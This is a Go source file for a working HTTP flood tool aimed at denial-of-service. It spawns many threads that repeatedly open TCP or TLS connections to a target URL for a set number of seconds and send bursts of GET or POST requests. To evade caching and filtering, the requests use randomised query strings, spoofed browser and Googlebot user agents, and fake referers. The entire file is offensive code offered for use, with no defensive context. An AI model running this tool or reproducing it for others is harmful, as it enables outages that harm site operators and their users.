

package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

var (
	host      = ""
	port      = "80"
	page      = ""
	mode      = ""
	abcd      = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM"
	start     = make(chan bool)
	acceptall = []string{
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
",
		"Accept-Encoding: gzip, deflate
",
		"Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Charset: iso-8859-1
Accept-Encoding: gzip
",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Charset: iso-8859-1
",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1
Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1
Accept-Charset: utf-8, iso-8859-1;q=0.5
",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*
Accept-Language: en-US,en;q=0.5
",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*
Accept-Encoding: gzip
Accept-Charset: utf-8, iso-8859-1;q=0.5
Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1
",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1
Accept-Encoding: gzip
Accept-Language: en-US,en;q=0.5
Accept-Charset: utf-8, iso-8859-1;q=0.5
",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8
Accept-Language: en-US,en;q=0.5
",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5
Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1
",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5
",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1
",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Charset: iso-8859-1
"}
	key     string
	choice  = []string{"Macintosh", "Windows", "X11"}
	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
	choice3 = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
	choice4 = []string{"Linux i686", "Linux x86_64"}
	choice5 = []string{"chrome", "spider", "ie"}
	choice6 = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}
	spider  = []string{
		"AdsBot-Google ( http://www.google.com/adsbot.html)",
		"Baiduspider ( http://www.baidu.com/search/spider.htm)",
		"FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
		"Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
		"Googlebot-Image/1.0",
		"Googlebot-News",
		"Googlebot-Video/1.0",
	}
	referers = []string{
		"https://www.google.com/search?q=",
		"https://check-host.net/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.fbi.com/",
		"https://www.bing.com/search?q=",
		"https://r.search.yahoo.com/",
		"https://www.cia.gov/index.html",
		"https://vk.com/profile.php?auto=",
		"https://www.usatoday.com/search/results?q=",
		"https://help.baidu.com/searchResult?keywords=",
		"https://steamcommunity.com/market/search?q=",
		"https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
	}
)

func init() {
	rand.Seed(time.Now().UnixNano())
}
func getuseragent() string {

	platform := choice[rand.Intn(len(choice))]
	var os string
	if platform == "Macintosh" {
		os = choice2[rand.Intn(len(choice2)-1)]
	} else if platform == "Windows" {
		os = choice3[rand.Intn(len(choice3)-1)]
	} else if platform == "X11" {
		os = choice4[rand.Intn(len(choice4)-1)]
	}
	browser := choice5[rand.Intn(len(choice5)-1)]
	if browser == "chrome" {
		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
		uwu := strconv.Itoa(rand.Intn(99)) + ".0" + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999))
		return "Mozilla/5.0 (" + os + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + uwu + " Safari/" + webkit
	} else if browser == "ie" {
		uwu := strconv.Itoa(rand.Intn(99)) + ".0"
		engine := strconv.Itoa(rand.Intn(99)) + ".0"
		option := rand.Intn(1)
		var token string
		if option == 1 {
			token = choice6[rand.Intn(len(choice6)-1)] + "; "
		} else {
			token = ""
		}
		return "Mozilla/5.0 (compatible; MSIE " + uwu + "; " + os + "; " + token + "Trident/" + engine + ")"
	}
	return spider[rand.Intn(len(spider))]
}

func contain(char string, x string) int { 
	times := 0
	ans := 0
	for i := 0; i < len(char); i++ {
		if char[times] == x[0] {
			ans = 1
		}
		times++
	}
	return ans
}

func flood() {
	addr := host + ":" + port
	header := ""
	if mode == "get" {
		header += " HTTP/1.1
Host: "
		header += addr + "
"
		if os.Args[5] == "nil" {
			header += "Connection: Keep-Alive
Cache-Control: max-age=0
"
			header += "User-Agent: " + getuseragent() + "
"
			header += acceptall[rand.Intn(len(acceptall))]
			header += referers[rand.Intn(len(referers))] + "
"
		} else {
			func() {
				fi, err := os.Open(os.Args[5])
				if err != nil {
					fmt.Printf("Error: %s
", err)
					return
				}
				defer fi.Close()
				br := bufio.NewReader(fi)
				for {
					a, _, c := br.ReadLine()
					if c == io.EOF {
						break
					}
					header += string(a) + "
"
				}
			}()
		}
	} else if mode == "post" {
		data := ""
		if os.Args[5] != "nil" {
			func() {
				fi, err := os.Open(os.Args[5])
				if err != nil {
					fmt.Printf("Error: %s
", err)
					return
				}
				defer fi.Close()
				br := bufio.NewReader(fi)
				for {
					a, _, c := br.ReadLine()
					if c == io.EOF {
						break
					}
					header += string(a) + "
"
				}
			}()

		} else {
			data = "f"
		}
		header += "POST " + page + " HTTP/1.1
Host: " + addr + "
"
		header += "Connection: Keep-Alive
Content-Type: x-www-form-urlencoded
Content-Length: " + strconv.Itoa(len(data)) + "
"
		header += "Accept-Encoding: gzip, deflate

" + data + "
"
	}
	var s net.Conn
	var err error
	<-start //received signal
	for {
		if port == "443" {
			cfg := &tls.Config{
				InsecureSkipVerify: true,
				ServerName:         host, //simple fix
			}
			s, err = tls.Dial("tcp", addr, cfg)
		} else {
			s, err = net.Dial("tcp", addr)
		}
		if err != nil {
			fmt.Println("Connection Down!!!") //When showing this message, it means ur ip got blocked or the target server down.
		} else {
			for i := 0; i < 100; i++ {
				request := ""
				if os.Args[3] == "get" {
					request += "GET " + page + key
					request += strconv.Itoa(rand.Intn(2147483647)) + string(string(abcd[rand.Intn(len(abcd))])) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))])
				}
				request += header + "
"
				s.Write([]byte(request))
			}
			s.Close()
		}
	}
}

func main() {
	if len(os.Args) != 6 {
		fmt.Println("Post Mode will use header.txt as data")
		fmt.Println("If you are using linux please run 'ulimit -n 999999' first!!!")
		fmt.Println("Usage: ", os.Args[0], "<url> <threads> <get/post> <seconds> <header.txt/nil>")
		os.Exit(1)
	}
	u, err := url.Parse(os.Args[1])
	if err != nil {
		println("Please input a correct url")
	}
	tmp := strings.Split(u.Host, ":")
	host = tmp[0]
	if u.Scheme == "https" {
		port = "443"
	} else {
		port = u.Port()
	}
	if port == "" {
		port = "80"
	}
	page = u.Path
	if os.Args[3] != "get" && os.Args[3] != "post" {
		println("Wrong mode, Only can use "get" or "post"")
		return
	}
	mode = os.Args[3]
	threads, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("Threads should be a integer")
	}
	limit, err := strconv.Atoi(os.Args[4])
	if err != nil {
		fmt.Println("limit should be a integer")
	}
	if contain(page, "?") == 0 {
		key = "?"
	} else {
		key = "&"
	}

	for i := 0; i < threads; i++ {
		time.Sleep(time.Microsecond * 100)
		go flood()
		fmt.Printf("-->[%.0f]", float64(i+1))
		os.Stdout.Sync()
	}
	fmt.Println("Flood will end in " + os.Args[4] + " seconds.")
	close(start)
	time.Sleep(time.Duration(limit) * time.Second)
}
